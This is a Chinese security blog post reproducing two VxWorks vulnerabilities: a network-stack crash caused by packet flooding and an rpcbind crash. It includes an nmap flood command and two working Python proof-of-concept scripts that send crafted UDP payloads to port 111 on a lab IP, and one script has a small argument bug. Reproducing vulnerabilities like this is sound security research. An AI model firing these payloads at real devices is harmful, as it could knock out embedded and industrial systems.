@@ -1,0 +1,384 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.3.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/css/all.min.css" integrity="sha256-AbA177XfpSnFEvgpYu1jMygiLabzPCJCRIBtR5jGc0k=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"iqiqiya.com","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.13.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="0x00 前言关于VxWorks，这里引用44CON议题《攻击 VxWorks：从石器时代到星际》探究一文章中的介绍：  VxWorks 是世界上使用最广泛的一种在嵌入式系统中部署的实时操作系统，是由美国WindRiver公司（简称风河公司，即WRS 公司）于1983年设计开发的。其市场范围跨越所有的安全关键领域，仅举几例，包括火星好奇心流浪者、波音787梦幻客机、网络路由器。这些应用程序的安全高">
+<meta property="og:type" content="article">
+<meta property="og:title" content="VxWorks漏洞复现">
+<meta property="og:url" content="https://iqiqiya.com/posts/2f09a2a6.html">
+<meta property="og:site_name" content="iqiqiya&#39;s blog">
+<meta property="og:description" content="0x00 前言关于VxWorks，这里引用44CON议题《攻击 VxWorks：从石器时代到星际》探究一文章中的介绍：  VxWorks 是世界上使用最广泛的一种在嵌入式系统中部署的实时操作系统，是由美国WindRiver公司（简称风河公司，即WRS 公司）于1983年设计开发的。其市场范围跨越所有的安全关键领域，仅举几例，包括火星好奇心流浪者、波音787梦幻客机、网络路由器。这些应用程序的安全高">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://iqiqiya.com/posts/2f09a2a6/1589787832884-ed1c0682-d13d-4c12-87b7-3580fc39909a.png">
+<meta property="og:image" content="https://iqiqiya.com/posts/2f09a2a6/1589790127724-3a34350a-5ba3-4938-a242-9d768e4f3901.png">
+<meta property="og:image" content="https://iqiqiya.com/posts/2f09a2a6/1589790442540-7cbefa09-6d1d-47c6-a0c7-4d08ff5a7df2.png">
+<meta property="article:published_time" content="2020-06-17T01:57:14.000Z">
+<meta property="article:modified_time" content="2020-11-19T04:43:27.366Z">
+<meta property="article:author" content="iqiqiya">
+<meta property="article:tag" content="漏洞复现">
+<meta property="article:tag" content="VxWorks">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://iqiqiya.com/posts/2f09a2a6/1589787832884-ed1c0682-d13d-4c12-87b7-3580fc39909a.png">
+
+
+<link rel="canonical" href="https://iqiqiya.com/posts/2f09a2a6.html">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://iqiqiya.com/posts/2f09a2a6.html","path":"posts/2f09a2a6.html","title":"VxWorks漏洞复现"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>VxWorks漏洞复现 | iqiqiya's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">iqiqiya's blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">iqiqiya的博客</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">0x00 前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-%E6%BC%8F%E6%B4%9E%E8%AF%A6%E6%83%85"><span class="nav-number">2.</span> <span class="nav-text">0x01 漏洞详情</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BD%91%E7%BB%9C%E6%A0%88%E9%97%AE%E9%A2%98"><span class="nav-number">2.1.</span> <span class="nav-text">网络栈问题</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1%E3%80%81%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0"><span class="nav-number">2.1.1.</span> <span class="nav-text">1、漏洞描述</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2%E3%80%81%E9%AA%8C%E8%AF%81%E6%96%B9%E5%BC%8F"><span class="nav-number">2.1.2.</span> <span class="nav-text">2、验证方式</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#rpcbind%E6%9C%8D%E5%8A%A1%E9%97%AE%E9%A2%98"><span class="nav-number">2.2.</span> <span class="nav-text">rpcbind服务问题</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1%E3%80%81%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0-1"><span class="nav-number">2.2.1.</span> <span class="nav-text">1、漏洞描述</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2%E3%80%81%E9%AA%8C%E8%AF%81%E6%96%B9%E5%BC%8F-1"><span class="nav-number">2.2.2.</span> <span class="nav-text">2、验证方式</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="nav-number">3.</span> <span class="nav-text">0x03 参考资料</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="iqiqiya"
+      src="/images/avatar.gif">
+  <p class="site-author-name" itemprop="name">iqiqiya</p>
+  <div class="site-description" itemprop="description">喜欢的话就坚持吧！</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">35</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">17</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">61</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author site-overview-item animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/iqiqiya" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;iqiqiya" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:iqiqiya@outlook.com" title="E-Mail → mailto:iqiqiya@outlook.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://iqiqiya.com/posts/2f09a2a6.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="iqiqiya">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="iqiqiya's blog">
+      <meta itemprop="description" content="喜欢的话就坚持吧！">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="VxWorks漏洞复现 | iqiqiya's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          VxWorks漏洞复现
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2020-06-17 09:57:14" itemprop="dateCreated datePublished" datetime="2020-06-17T09:57:14+08:00">2020-06-17</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2020-11-19 12:43:27" itemprop="dateModified" datetime="2020-11-19T12:43:27+08:00">2020-11-19</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" itemprop="url" rel="index"><span itemprop="name">漏洞复现</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">工控安全</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p><strong>关于VxWorks，这里引用44CON议题</strong><a target="_blank" rel="noopener" href="http://www.freebuf.com/vuls/78277.html"><strong>《攻击 VxWorks：从石器时代到星际》</strong></a><strong>探究一文章中的介绍：</strong></p>
+<blockquote>
+<p>VxWorks 是世界上使用最广泛的一种在嵌入式系统中部署的实时操作系统，是由美国WindRiver公司（简称风河公司，即WRS 公司）于1983年设计开发的。其市场范围跨越所有的安全关键领域，仅举几例，包括火星好奇心流浪者、波音787梦幻客机、网络路由器。这些应用程序的安全高危性质使得VxWorks的安全被高度关注。<br>VxWorks操作系统是由美国Wind River(风河公司)开发的一种嵌入式实时操作系统（RTOS），已宣称拥有至少15亿台设备，VxWorks支持几乎所有现代市场上的嵌入式CPU架构，包括x86系列、MIPS、 PowerPC、Freescale ColdFire、Intel i960、SPARC、SH-4、ARM, StrongARM以及xScale CPU。</p>
+</blockquote>
+<h2 id="0x01-漏洞详情"><a href="#0x01-漏洞详情" class="headerlink" title="0x01 漏洞详情"></a>0x01 漏洞详情</h2><h3 id="网络栈问题"><a href="#网络栈问题" class="headerlink" title="网络栈问题"></a>网络栈问题</h3><h4 id="1、漏洞描述"><a href="#1、漏洞描述" class="headerlink" title="1、漏洞描述"></a>1、漏洞描述</h4><p>部分5.x版本的VxWorks系统在短时间内接受到大量的网络数据包，会造成网络栈崩溃，导致VxWorks无法再与外界主机通信。在部分情况下，终端会给出错误信息，报错信息如下图：<br><img src="/posts/2f09a2a6/1589787832884-ed1c0682-d13d-4c12-87b7-3580fc39909a.png" alt="image.png"><br>但是需要注意的是：有的情况下漏洞触发成功而造成DOS攻击后，VxWorks终端并不会输出下面这串字符提示，但是此时VxWorks的网络栈已经崩溃，已无法再与外界通信，这一点可以通过持续ping来验证。如上错误提示一般会在收到的数据包量非常大的情况下才会出现。</p>
+<blockquote>
+<p>interrupt: panic: netJobAdd: ring buffer overflow!</p>
+</blockquote>
+<h4 id="2、验证方式"><a href="#2、验证方式" class="headerlink" title="2、验证方式"></a>2、验证方式</h4><ol>
+<li>执行nmap命令（可能需要执行多次） nmap -sU -p110-166 -r -T5 -n 192.168.102.88 ，其中192.168.102.88为运行VxWorks5.5版本的主机IP。</li>
+</ol>
+<p><img src="/posts/2f09a2a6/1589790127724-3a34350a-5ba3-4938-a242-9d768e4f3901.png" alt="image.png"></p>
+<ol start="2">
+<li>对tcp&#x2F;21运行的FTP服务连续发送体积极大的FTP请求数据包。</li>
+<li>也可用如下Python代码验证该问题：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">hvcost = <span class="string">&quot;192.168.102.88&quot;</span></span><br><span class="line">UDP_PAYLOAD = <span class="string">&#x27;\x72\xfe\x1d\x13\x00\x00\x00\x00\x00\x00\x00\x02\x00\x01\x86\xa0\x00\x01\x97\x7c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">poc1</span>(<span class="params">host, rpcPort=<span class="number">111</span>, pktNum=<span class="number">6859</span></span>):</span><br><span class="line"> sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line"> <span class="keyword">for</span> i <span class="keyword">in</span> xrange(pktNum):</span><br><span class="line"> 	sock.sendto(UDP_PAYLOAD, (hvcost, <span class="number">111</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">poc2</span>(<span class="params">host, rpcPort=<span class="number">111</span>, portNum=<span class="number">26</span></span>):</span><br><span class="line"> sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line"> <span class="keyword">for</span> port <span class="keyword">in</span> xrange(rpcPort, rpcPort+portNum+<span class="number">1</span>):</span><br><span class="line"> 	sock.sendto(UDP_PAYLOAD, (host, port))</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"> <span class="keyword">import</span> sys</span><br><span class="line"> poc1(host=sys.argv[<span class="number">0</span>], rpcPort=<span class="number">111</span>, pktNum=<span class="number">100000000</span>)</span><br><span class="line"> <span class="comment">#poc2(host=sys.argv[1], rpcPort=111, portNum=27)</span></span><br></pre></td></tr></table></figure></li>
+</ol>
+<h3 id="rpcbind服务问题"><a href="#rpcbind服务问题" class="headerlink" title="rpcbind服务问题"></a>rpcbind服务问题</h3><h4 id="1、漏洞描述-1"><a href="#1、漏洞描述-1" class="headerlink" title="1、漏洞描述"></a>1、漏洞描述</h4><p>rpcbind服务是SUN-RPC的一部分，在VxWorks系统中该服务监听在tcp&#x2F;111及udp&#x2F;111端口，攻击者向该端口发送经过特殊构造的数据包，可使rpcbind服务崩溃，精心构造的请求可能可以造成任意代码执行，影响5.X和6.X版本。终端会给出错误信息，报错信息如下图：<br><img src="/posts/2f09a2a6/1589790442540-7cbefa09-6d1d-47c6-a0c7-4d08ff5a7df2.png" alt="image.png"></p>
+<h4 id="2、验证方式-1"><a href="#2、验证方式-1" class="headerlink" title="2、验证方式"></a>2、验证方式</h4><p>可用如下Python代码验证该漏洞：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">PAYLOAD_HEX = <span class="string">&#x27;cc6ff7e200000000000000020001a086000000040000000488888888000000110000001100001111111111111111111111111111&#x27;</span></span><br><span class="line"><span class="comment">#hvcost = &quot;192.168.102.88&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">poc</span>(<span class="params">host, rpcPort=<span class="number">111</span></span>):</span><br><span class="line">    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">    sock.sendto(PAYLOAD_HEX.decode(<span class="string">&#x27;hex&#x27;</span>), (host, rpcPort))</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment">#import sys</span></span><br><span class="line">    poc(host=<span class="string">&quot;192.168.102.88&quot;</span>, rpcPort=<span class="number">111</span>)</span><br></pre></td></tr></table></figure>
+<h2 id="0x03-参考资料"><a href="#0x03-参考资料" class="headerlink" title="0x03 参考资料"></a>0x03 参考资料</h2><p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/d156809e0e64">https://www.jianshu.com/p/d156809e0e64</a><br><a target="_blank" rel="noopener" href="https://www.freebuf.com/news/93201.html">https://www.freebuf.com/news/93201.html</a></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="tag"># 漏洞复现</a>
+              <a href="/tags/VxWorks/" rel="tag"># VxWorks</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/posts/bc8b27aa.html" rel="prev" title="利用Cloudflare快速发现子域名">
+                  <i class="fa fa-chevron-left"></i> 利用Cloudflare快速发现子域名
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/posts/16f38465.html" rel="next" title="VxWorks5.5.1环境搭建">
+                  VxWorks5.5.1环境搭建 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">iqiqiya</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  
+<script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.0/search.js" integrity="sha256-vXZMYLEqsROAXkEw93GGIvaB2ab+QW6w3+1ahD9nXXA=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
